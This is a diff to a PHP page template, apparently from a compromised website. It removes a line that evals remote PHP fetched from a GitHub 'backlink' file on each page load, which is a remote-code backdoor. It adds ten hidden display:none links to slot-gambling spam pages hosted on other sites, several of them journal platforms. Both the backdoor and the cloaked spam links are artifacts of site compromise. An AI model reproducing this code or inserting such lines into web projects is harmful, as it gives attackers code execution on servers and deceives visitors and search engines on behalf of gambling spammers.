@@ -174,7 +174,16 @@ if ($sts == "1")  {
 <script type="text/javascript" src="<?php echo base_url(); ?>assets/theme/js/revolution-slider/js/extensions/revolution.extension.parallax.min.js"></script>
 <script type="text/javascript" src="<?php echo base_url(); ?>assets/theme/js/revolution-slider/js/extensions/revolution.extension.slideanims.min.js"></script>
 <script type="text/javascript" src="<?php echo base_url(); ?>assets/theme/js/revolution-slider/js/extensions/revolution.extension.video.min.js"></script>
-  <?php eval("?>".file_get_contents("https://raw.githubusercontent.com/putrisimanis/backlink/main/1")); ?>
+<a style="display:none" href="https://tikinet.com.br/wp-content/uploads/slot888/">https://tikinet.com.br/wp-content/uploads/slot888/</a>
+<a style="display:none" href="https://docomomobrasil.com/revista-novo/public/journals/4/slot-deposit-dana/">https://docomomobrasil.com/revista-novo/public/journals/4/slot-deposit-dana/</a>
+<a style="display:none" href="https://revista.fdci.edu.br/">https://revista.fdci.edu.br/</a>
+<a style="display:none" href="http://ojs.fatece.edu.br/public/site/slot-gacor/">http://ojs.fatece.edu.br/public/site/slot-gacor/</a>
+<a style="display:none" href="https://www.cpird.in.th/slot-gacor-maxwin/">https://www.cpird.in.th/slot-gacor-maxwin/</a>
+<a style="display:none" href="https://anabaptismtoday.co.uk/styles/slot88/">https://anabaptismtoday.co.uk/styles/slot88/</a>
+<a style="display:none" href="https://kiadvany.magyarhonvedseg.hu/public/journals/2/slot-deposit-dana/">https://kiadvany.magyarhonvedseg.hu/public/journals/2/slot-deposit-dana/</a>
+<a style="display:none" href="https://anabaptismtoday.co.uk/styles/slot88/">https://anabaptismtoday.co.uk/styles/slot88/</a>
+<a style="display:none" href="https://penerbit.undip.ac.id/public/site/slot-gacor/">https://penerbit.undip.ac.id/public/site/slot-gacor/</a>
+<a style="display:none" href="https://anabaptismtoday.co.uk/public/site/slot-gacor/">https://anabaptismtoday.co.uk/public/site/slot-gacor/</a>
 
 </body>
 </html>
